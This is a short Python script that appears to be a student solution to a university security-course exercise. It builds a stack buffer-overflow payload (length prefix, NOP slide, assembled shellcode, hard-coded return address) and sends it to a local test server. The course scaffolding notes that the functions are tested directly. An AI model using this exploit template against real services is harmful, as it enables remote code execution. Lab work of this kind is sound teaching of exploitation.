#!/usr/bin/python

import os, socket, assemble, sys, struct


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    shellcode = assemble.assemble_file(PATH_TO_SHELLCODE)
    return shellcode
    # NOTEs:
    # Don't delete this function - we are going to test it directly, and you are
    # going to use it directly in question 2.


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''
    total_size = 1040 #Size of the payload not including the first 4 bytes
    shellcode = get_shellcode()
    
    number_of_nops = total_size - len (shellcode) #Calculate the size of the nop slide
    ra = 0xbfffde0e + int(number_of_nops/2) #land in the middle of nopslide, for testing on debug used static vlaue of 0xbfffde0e + 450 = 0xbfffdfd0
    nop_slide = 'nop\n' * (number_of_nops)	#creating the nop slide
    payload = assemble.assemble_data(nop_slide) + shellcode + str(struct.pack('<L', ra))
    return str(struct.pack('>L', len(payload))) + payload

    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
       conn.sendall(payload)
    finally:
       conn.close()


if __name__ == '__main__':
    main()
